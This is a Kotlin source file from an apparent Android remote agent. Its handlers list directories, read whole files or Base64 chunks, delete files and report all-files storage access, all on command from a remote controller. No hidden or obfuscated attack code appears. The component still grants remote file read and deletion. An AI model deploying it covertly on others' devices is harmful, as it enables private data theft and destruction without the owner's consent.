package com.remoteagent.protocol.commands

import android.content.Context
import android.os.Build
import android.os.Environment
import com.remoteagent.media.StorageListing
import com.remoteagent.protocol.CommandResult
import com.remoteagent.protocol.DeviceCommand
import org.json.JSONObject
import java.io.File
import java.io.FileInputStream
import java.io.RandomAccessFile
import java.util.Base64

/**
 * File system commands: list, read, chunked read, delete, directory listing.
 * Listing uses [StorageListing] so shared media is visible across Android 8–15.
 */
class FileCommands(private val context: Context) {

    fun list(command: DeviceCommand): CommandResult {
        val path = command.getString("path", "/")
        return try {
            val result = StorageListing.list(context.applicationContext, path)
            CommandResult.success(result.toString())
        } catch (e: Exception) {
            CommandResult.failed("Failed to list files: ${e.message}")
        }
    }

    fun read(command: DeviceCommand): CommandResult {
        val path = command.getString("path", "")
        if (path.isEmpty()) {
            return CommandResult.failed("Path is required")
        }

        return try {
            val file = File(path)
            when {
                !file.exists() -> CommandResult.failed("File not found: $path")
                file.isDirectory -> CommandResult.failed("Path is a directory")
                !file.canRead() -> CommandResult.failed("Cannot read file: $path")
                file.length() > 50 * 1024 * 1024 -> CommandResult.failed(
                    "File too large for one-shot read (max 50MB); use chunked download"
                )
                else -> {
                    val data = ByteArray(file.length().toInt())
                    FileInputStream(file).use { it.read(data) }
                    CommandResult.success(data)
                }
            }
        } catch (e: Exception) {
            CommandResult.failed("Failed to read file: ${e.message}")
        }
    }

    fun readChunk(command: DeviceCommand): CommandResult {
        val path = command.getString("path", "")
        if (path.isEmpty()) {
            return CommandResult.failed("Path is required")
        }

        val offset = command.getLong("offset", 0).coerceAtLeast(0)
        var size = command.getInt("size", 96 * 1024)
        if (size <= 0) size = 96 * 1024
        if (size > 256 * 1024) size = 256 * 1024

        return try {
            val file = File(path)
            when {
                !file.exists() || file.isDirectory -> CommandResult.failed("File not found: $path")
                !file.canRead() -> CommandResult.failed("Cannot read file: $path")
                else -> {
                    val fileSize = file.length()
                    if (offset >= fileSize) {
                        return emptyChunk(offset, fileSize)
                    }

                    val toRead = minOf(size.toLong(), fileSize - offset).toInt()
                    val buffer = ByteArray(toRead)
                    val bytesRead = RandomAccessFile(file, "r").use { raf ->
                        raf.seek(offset)
                        raf.read(buffer)
                    }

                    if (bytesRead <= 0) {
                        return emptyChunk(offset, fileSize)
                    }

                    val slice = if (bytesRead == buffer.size) buffer else buffer.copyOf(bytesRead)
                    CommandResult.success(
                        JSONObject().apply {
                            put("content", Base64.getEncoder().encodeToString(slice))
                            put("bytes_read", bytesRead)
                            put("offset", offset)
                            put("file_size", fileSize)
                        }.toString()
                    )
                }
            }
        } catch (e: Exception) {
            CommandResult.failed("Failed to read file chunk: ${e.message}")
        }
    }

    fun delete(command: DeviceCommand): CommandResult {
        val path = command.getString("path", "")
        if (path.isEmpty()) {
            return CommandResult.failed("Path is required")
        }

        return try {
            val file = File(path)
            when {
                !file.exists() -> CommandResult.failed("File not found: $path")
                !file.canWrite() -> CommandResult.failed("Cannot delete file: $path")
                file.delete() -> CommandResult.success(
                    JSONObject().apply {
                        put("deleted", true)
                        put("path", path)
                    }.toString()
                )
                else -> CommandResult.failed("Failed to delete file")
            }
        } catch (e: Exception) {
            CommandResult.failed("Failed to delete file: ${e.message}")
        }
    }

    /** Alias of [list] for FILE_GET_DIRECTORY. */
    fun getDirectory(command: DeviceCommand): CommandResult = list(command)

    fun storageStatus(): JSONObject {
        return JSONObject().apply {
            put("legacy_external", Build.VERSION.SDK_INT < Build.VERSION_CODES.Q)
            put(
                "all_files_access",
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                    Environment.isExternalStorageManager()
                } else {
                    true
                }
            )
            put("primary", Environment.getExternalStorageDirectory()?.absolutePath)
        }
    }

    fun register(into: MutableMap<DeviceCommand.CommandType, CommandExecutor>) {
        into[DeviceCommand.CommandType.FILE_LIST] = CommandExecutor { list(it) }
        into[DeviceCommand.CommandType.FILE_READ] = CommandExecutor { read(it) }
        into[DeviceCommand.CommandType.FILE_READ_CHUNK] = CommandExecutor { readChunk(it) }
        into[DeviceCommand.CommandType.FILE_DELETE] = CommandExecutor { delete(it) }
        into[DeviceCommand.CommandType.FILE_GET_DIRECTORY] = CommandExecutor { getDirectory(it) }
    }

    private fun emptyChunk(offset: Long, fileSize: Long): CommandResult {
        return CommandResult.success(
            JSONObject().apply {
                put("content", "")
                put("bytes_read", 0)
                put("offset", offset)
                put("file_size", fileSize)
            }.toString()
        )
    }
}
